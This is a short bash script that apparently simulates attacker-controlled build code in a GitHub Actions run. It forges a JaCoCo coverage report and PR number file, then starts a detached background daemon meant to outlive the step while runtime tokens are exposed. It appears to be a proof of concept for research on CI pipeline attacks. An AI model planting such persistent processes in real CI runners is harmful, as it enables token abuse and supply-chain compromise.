#!/usr/bin/env bash
# Simulates attacker-controlled build code (e.g. `mvn verify`) executed by a
# JS action wrapper that inherited ACTIONS_RUNTIME_TOKEN / ACTIONS_RESULTS_URL.
set -euo pipefail
mkdir -p bull-report/target/site/jacoco-aggregate
echo '<report><counter type="LINE" missed="1" covered="99"/></report>' > bull-report/target/site/jacoco-aggregate/jacoco.xml
echo '1' > pr_number.txt
setsid nohup python3 api.py shadow pr-coverage-report > "$RUNNER_TEMP/daemon.log" 2>&1 < /dev/null &
echo "daemon started pid=$!"
